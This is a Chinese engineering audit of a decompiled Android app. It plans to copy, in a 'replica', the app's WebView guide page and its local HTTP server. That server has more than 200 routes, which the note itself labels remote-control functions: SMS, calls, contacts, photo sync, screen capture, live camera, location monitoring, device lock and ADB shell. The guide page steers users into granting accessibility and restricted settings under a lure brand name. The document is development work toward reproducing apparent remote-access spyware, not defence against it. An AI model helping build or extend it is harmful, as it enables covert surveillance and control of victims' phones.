# WebView 引导页 & URL Scheme 拦截审计

> 更新日期: 2026-03-23
> 审计对象: vendor `e0/d.java` (WebViewClient) + `server/b.java` (本地HTTP服务器)
> replica 对象: `AppWebViewClient.java` + `AppWebView.java`

---

## 1. 背景

211 设备真机调试发现：弹窗关闭后 WebView 显示错误页面：

```
网页无法打开
位于 js://startAccessibility 的网页无法加载，因为：
net::ERR_UNKNOWN_URL_SCHEME
```

原因：引导页按钮使用自定义 URL scheme `js://startAccessibility` 与原生代码通信，
但 replica 的 `AppWebViewClient.shouldOverrideUrlLoading()` 是空实现，未拦截此 scheme。

---

## 2. Vendor 架构

### 2.1 通信链路

```
WebView 引导页 (guide.accessibility.rathat.org)
    │
    ├── 页面按钮点击 → window.location = "js://startAccessibility"
    │
    ▼
WebViewClient.shouldOverrideUrlLoading()  [e0/d.java]
    │
    ├── 拦截自定义 scheme (js://)
    ├── 提取路径 → /startAccessibility
    │
    ▼
本地 HTTP 服务器  [server/b.java]
    │
    ├── X1(path, body, responseHandler) 方法
    ├── hashCode switch 分发 200+ 路由
    │
    ▼
原生操作执行 (打开设置、请求权限、UI自动化等)
```

### 2.2 Vendor 关键文件

| 文件 | 类名 | 行数 | 作用 |
|------|------|------|------|
| `e0/d.java` | WebViewClient | 91行 | `shouldOverrideUrlLoading` 拦截自定义 scheme (520条指令，反编译不完整) |
| `server/b.java` | HttpServer | ~5000行 | 本地 HTTP 服务器，`X1()` 处理 200+ 路由 |

### 2.3 引导页实际加载 URL

```
https://guide.accessibility.rathat.org/{deviceId}/guide/{pageIndex}
```

- `{deviceId}`: 设备唯一标识 (如 `860616249851785216`)
- `{pageIndex}`: 引导页索引 (从 0 开始)
- URL 由 `AppConfig.guideAccessibilityHost` 配置覆盖

---

## 3. 引导页 UI 结构 (211 真机截图)

```
┌──────────────────────────────────┐
│  开启[StripChat助手]             │  ← 页面标题
│                                  │
│  ● 立即开启[StripChat助手]       │  ← js://startAccessibility
│                                  │
│  ● 前往应用管理,允许[限制性设置] │  ← js://startAppDetailSetting (推测)
│                                  │
│  ● 前往应用详情,允许[限制性设置] │  ← js://startSettings (推测)
│                                  │
│  如果不授予这项受限权限,          │
│  [StripChat助手]无法正常运行     │
│                                  │
│  ● 前往应用详情,允许[限制性设置] │
└──────────────────────────────────┘
```

页面被 AlertDialog 引导弹窗完全遮挡。

---

## 4. 引导页相关的 URL Scheme

### 4.1 高优先级 (引导页直接使用)

| URL Scheme | server/b.java case | 原生操作 |
|------------|-------------------|---------|
| `js://startAccessibility` | case 20 | 打开无障碍设置 / 执行 GlobalAction |
| `js://startAppDetailSetting` | - | 打开应用详情设置页 |
| `js://startSettings` | - | 打开系统设置 |
| `js://ignoreBatteryOptimization` | - | 申请电池优化白名单 |
| `js://requestPermission` | - | 请求运行时权限 |

### 4.2 `/startAccessibility` 处理逻辑

```java
// server/b.java 行 4039-4045
case 20:
    if (MyAccessibilityService.P() != null) {
        // 无障碍已启用: 执行 GlobalAction
        f1((GlobalActionCondition) h.d(str2, GlobalActionCondition.class), kVar);
        return;
    }
    // 无障碍未启用: 返回错误
    M1(kVar);
    return;
```

### 4.3 完整 URL Scheme 分类 (200+)

<details>
<summary>展开查看全部分类</summary>

| 分类 | 示例 scheme | 说明 |
|------|------------|------|
| 无障碍服务 | `/startAccessibility`, `/global/action` | 打开无障碍、全局操作 |
| 应用管理 | `/startApp`, `/install`, `/killApp` | 启动/安装/杀死应用 |
| 系统设置 | `/startSettings`, `/startDevSetting`, `/startWifiSetting` | 跳转各类系统设置 |
| 设备管理 | `/deviceAdmin`, `/startAdminActive`, `/confirmLock` | 设备管理员、锁屏 |
| 通信 | `/sendSms`, `/callPhone`, `/syncContacts` | 短信/电话/通讯录 |
| 全局输入 | `/global/copy`, `/global/paste`, `/global/setText` | 剪贴板、文本操作 |
| 权限 | `/requestPermission`, `/syncPermissions` | 运行时权限管理 |
| UI 交互 | `/target/action`, `/target/findOneByText` | 无障碍 UI 自动化 (40+) |
| 媒体 | `/screenshot/0`, `/screenrecord/start`, `/frontCameraLive` | 截屏/录屏/摄像头 |
| 电源 | `/syncPowerControl`, `/batteryState` | 电池/电源管理 |
| 监控 | `/realMonitorLocation`, `/activePackageName`, `/screenState` | 位置/状态监控 |
| 文件 | `/deleteFile`, `/asyncDownload`, `/uploadAppIcon` | 文件管理 |
| 调试 | `/enableDevelopment`, `/enableDebug`, `/openADBDebug` | 开发者/ADB 调试 |
| ADB | `/localAdbPair`, `/localAdbConnect`, `/localAdbShell` | ADB 本地操作 |
| 数据同步 | `/syncPhotos`, `/syncVideos`, `/syncPackages` | 同步各类数据 |
| 设备信息 | `/info`, `/version`, `/deviceId` | 设备基本信息 |

</details>

---

## 5. Replica 当前状态

### 5.1 AppWebViewClient.java (当前实现)

```java
// 行 89-92 — 空实现，未拦截任何自定义 scheme
@Override
public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
    return super.shouldOverrideUrlLoading(view, request);
}
```

### 5.2 差异对比

| 功能 | Vendor | Replica | 状态 |
|------|--------|---------|------|
| `shouldOverrideUrlLoading` | 拦截 `js://` scheme → 转发本地 HTTP | 空实现 | **未实现** |
| 本地 HTTP 服务器 | `server/b.java` 200+ 路由 | 不存在 | **未实现** |
| `/startAccessibility` | 打开无障碍设置 | 仅在 AlertDialog 中硬编码 | **部分实现** |
| `/startAppDetailSetting` | 打开应用详情 | 未实现 | **未实现** |
| 引导页 scheme 拦截 | 全部处理 | 无 → `ERR_UNKNOWN_URL_SCHEME` | **未实现** |

---

## 6. 修复方案

### 方案 A: 最小修复 (仅处理引导页 scheme)

在 `AppWebViewClient.shouldOverrideUrlLoading()` 中直接拦截引导页用到的几个 scheme，
不经过本地 HTTP 服务器，直接调用原生代码：

```java
@Override
public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
    Uri uri = request.getUrl();
    if ("js".equals(uri.getScheme())) {
        String host = uri.getHost(); // startAccessibility, startAppDetailSetting 等
        switch (host) {
            case "startAccessibility":
                // 打开系统无障碍设置
                break;
            case "startAppDetailSetting":
                // 打开应用详情设置
                break;
            // ... 其他引导页 scheme
        }
        return true; // 已处理，不加载 URL
    }
    return super.shouldOverrideUrlLoading(view, request);
}
```

**优点**: 改动小，快速修复引导页错误
**缺点**: 不对齐 vendor 本地 HTTP 服务器架构

### 方案 B: 完整复刻 (本地 HTTP 服务器)

实现 `server/b.java` 本地 HTTP 服务器 + `shouldOverrideUrlLoading` 转发。
这是 vendor 的核心通信架构，200+ 路由涉及所有远控功能。

**优点**: 完全对齐 vendor 架构
**缺点**: 工作量大 (~5000 行)，属于 MODULE_01 网络通信模块

### 建议

先用**方案 A** 修复引导页的 `ERR_UNKNOWN_URL_SCHEME` 错误，
后续实现 MODULE_01 网络通信模块时再切换到**方案 B**。

---

## 7. 临时调试状态

> **注意**: `AppWebView.java` 中 `setWebContentsDebuggingEnabled` 已临时改为 `true`，
> 用于 211 设备 WebView 调试。正式发布前需还原为 `false`。
